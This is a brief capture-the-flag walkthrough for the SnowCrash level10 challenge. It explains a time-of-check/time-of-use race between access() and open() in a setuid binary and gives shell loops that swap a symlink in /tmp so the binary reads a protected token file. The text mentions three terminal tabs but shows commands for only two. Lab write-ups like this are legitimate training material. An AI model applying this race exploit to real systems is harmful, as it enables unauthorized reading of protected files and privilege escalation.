The binary file use 'access' which is vunerable to check permissions as its operation is not atomic



level10@SnowCrash:~$ man 2 access
[...]
       Warning:  Using  these calls to check if a user is authorized to, for example, open a file
       before actually doing so using open(2) creates a security hole, because the user might ex‚Äê
       ploit the short time interval between checking and opening the file to manipulate it.  For
       this reason, the use of this system call should be avoided.

Me will use the short time between 'access' and 'open' to change the file to be opened (race condition exploit)
As me can see, 'level10' and 'token' both have read/write permission for user flag10
Me will try to access 'level10' but open 'token' instead
To do so, me will create a symbolic link 'expl' which will swap almost instantly between '~/level10' and '~/token'
Need a 3 tab



tab 1
level10@SnowCrash:~$ while true; do ln -fs ~/level10 /tmp/expl; ln -fs ~/token /tmp/expl; done

tab 2
level10@SnowCrash:~$ while true; do ./level10 /tmp/expl 127.0.0.1; done
